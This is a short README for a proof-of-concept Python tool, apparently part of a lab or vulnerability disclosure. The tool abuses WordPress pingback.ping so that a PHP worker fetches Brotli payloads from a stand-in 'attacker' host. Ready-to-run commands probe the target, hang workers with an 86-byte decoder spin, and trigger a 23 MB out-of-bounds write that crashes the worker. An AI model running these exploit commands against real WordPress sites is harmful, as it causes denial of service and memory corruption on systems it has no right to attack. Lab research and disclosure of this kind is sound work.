# PoC

`pingback_poc.py` is a standard-library Python client for the lab. It sends
`pingback.ping` to a WordPress site and classifies what happens to the PHP
worker.

```bash
python3 poc/pingback_poc.py --help

# 1. Is pingback exposed?
python3 poc/pingback_poc.py --target http://localhost:8080 --mode probe

# 2. 86-byte decoder spin (worker hang / SIGTERM)
python3 poc/pingback_poc.py \
  --target http://localhost:8080 \
  --payload-url http://attacker:8080/small.br \
  --mode hang --workers 4 --count 4 --show-logs

# 3. 23 MB OOB write (worker SIGSEGV)
python3 poc/pingback_poc.py \
  --target http://localhost:8080 \
  --payload-url http://attacker:8080/payload.br \
  --mode crash --workers 1 --count 1 --timeout 30 --show-logs
```

The target must resolve to a private/loopback address unless
`--i-own-this-target` is supplied.

Full documentation: [`../docs/poc.md`](../docs/poc.md).
